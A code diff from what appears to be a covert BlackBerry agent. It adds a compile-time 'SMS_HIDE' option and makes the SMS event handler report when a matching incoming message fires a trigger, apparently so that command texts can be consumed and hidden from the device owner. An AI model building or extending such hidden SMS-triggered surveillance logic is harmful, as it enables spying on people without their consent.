@@ -20,7 +20,9 @@ import javax.wireless.messaging.MessageListener;
 import javax.wireless.messaging.TextMessage;
 
 import net.rim.device.api.util.DataBuffer;
+import blackberry.agent.sms.SmsListener;
 import blackberry.agent.sms.SmsListener45;
+import blackberry.agent.sms.SmsListener46;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.SmsObserver;
@@ -49,7 +51,7 @@ public final class SmsEvent extends Event implements MessageListener,
     String number;
     String text;
 
-    SmsListener45 smsListener;
+    SmsListener smsListener;
 
     // private final boolean stop = false;
     private DatagramConnection dc;
@@ -67,7 +69,11 @@ public final class SmsEvent extends Event implements MessageListener,
         super(Event.EVENT_SMS, actionId, confParams, "SmsEvent");
         setPeriod(NEVER);
 
+        //#ifdef SMS_HIDE
+        smsListener = SmsListener46.getInstance();
+        //#else
         smsListener = SmsListener45.getInstance();
+        //#endif
     }
 
     protected void actualStart() {
@@ -185,7 +191,7 @@ public final class SmsEvent extends Event implements MessageListener,
         return true;
     }
 
-    public void onNewSms(byte[] dataMsg, String address, boolean incoming) {
+    public boolean onNewSms(byte[] dataMsg, String address, boolean incoming) {
 
         String msg = null;
 
@@ -203,8 +209,11 @@ public final class SmsEvent extends Event implements MessageListener,
                 //#endif
 
                 trigger();
+                return true;
             }
         }
+        
+        return false;
 
     }
 
